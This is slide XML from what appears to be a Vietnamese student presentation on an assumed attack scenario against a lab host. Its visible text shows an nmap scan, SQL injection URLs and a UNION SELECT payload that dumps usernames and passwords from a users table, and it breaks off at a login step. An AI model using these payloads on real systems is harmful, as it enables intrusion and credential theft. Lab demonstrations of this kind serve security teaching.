        <p:nvSpPr>
          <p:cNvPr id="289" name="Google Shape;289;p29"/>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5.2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kịch Bản Tấn Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giả Định:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="290" name="Google Shape;290;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11029950" cy="1905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1" name="Google Shape;291;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1293911" y="3890962"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F172A"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="10B98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2" name="Google Shape;292;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3168997" y="3890962"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F172A"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="10B98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3" name="Google Shape;293;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5044082" y="3890962"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F172A"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="10B98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4" name="Google Shape;294;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6919168" y="3890962"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F172A"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="10B98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5" name="Google Shape;295;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8794253" y="3890962"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F172A"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="10B98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6" name="Google Shape;296;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10669339" y="3890962"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0F172A"/>
          </a:solidFill>
          <a:ln w="38100" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="10B98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65"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;p28"/>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5.2. Kịch Bản Tấn Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giả Định:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="267" name="Google Shape;267;p28"/>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68" name="Google Shape;268;p28" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="1471612"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269" name="Google Shape;269;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1293902" y="1563300"/>
            <a:ext cx="2494200" cy="246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0B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>01. Reconnais</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>ance:</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2031400"/>
            <a:ext cx="4105200" cy="200100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>nmap -sV 192.168.221.134</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="271" name="Google Shape;271;p28"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1619250" y="2437700"/>
            <a:ext cx="8410575" cy="39147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00"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Google Shape;301;p30"/>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5.2. Kịch Bản Tấn Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giả Định:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p30"/>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03" name="Google Shape;303;p30" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="1471612"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Google Shape;304;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2031400"/>
            <a:ext cx="4105200" cy="200100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>http://192.168.221.134/search.php?id=' OR '1'='1</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1330876" y="1606050"/>
            <a:ext cx="1755300" cy="246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0B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>02. SQLi Exploit</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="306" name="Google Shape;306;p30" title="Screenshot 2026-05-27 023328.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2800275" y="2394950"/>
            <a:ext cx="6119274" cy="42686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10"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Google Shape;311;p31"/>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5.2. Kịch Bản Tấn Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giả Định:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="312" name="Google Shape;312;p31"/>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13" name="Google Shape;313;p31" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="1471612"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="314" name="Google Shape;314;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2031400"/>
            <a:ext cx="5591100" cy="200100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>http://192.168.221.134/search.php?id=' UNION SELECT 1,database(),3,4 -- -</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="315" name="Google Shape;315;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1330872" y="1584675"/>
            <a:ext cx="1926600" cy="246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0B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>03. DB Enum</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="316" name="Google Shape;316;p31" title="Screenshot 2026-05-27 023622.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2305050" y="2416325"/>
            <a:ext cx="6372225" cy="42481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20"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="321" name="Google Shape;321;p32"/>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5.2. Kịch Bản Tấn Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giả Định:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322" name="Google Shape;322;p32"/>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23" name="Google Shape;323;p32" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="1471612"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="324" name="Google Shape;324;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2031400"/>
            <a:ext cx="8658300" cy="558600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>http://192.168.221.134/search.php?id=' UNION SELECT 1,username,password,4 FROM users -- -</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="325" name="Google Shape;325;p32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1311050" y="1595350"/>
            <a:ext cx="1946400" cy="246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0B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>04. Dump Creds</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="326" name="Google Shape;326;p32" title="Screenshot 2026-05-27 023827.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2038350" y="2523700"/>
            <a:ext cx="6542012" cy="4029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0"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="331" name="Google Shape;331;p33"/>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5.2. Kịch Bản Tấn Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giả Định:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="332" name="Google Shape;332;p33"/>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33" name="Google Shape;333;p33" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="723900" y="1471612"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="334" name="Google Shape;334;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1000125" y="2416325"/>
            <a:ext cx="2524200" cy="1485300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="330200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>- Đăng nhập:</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
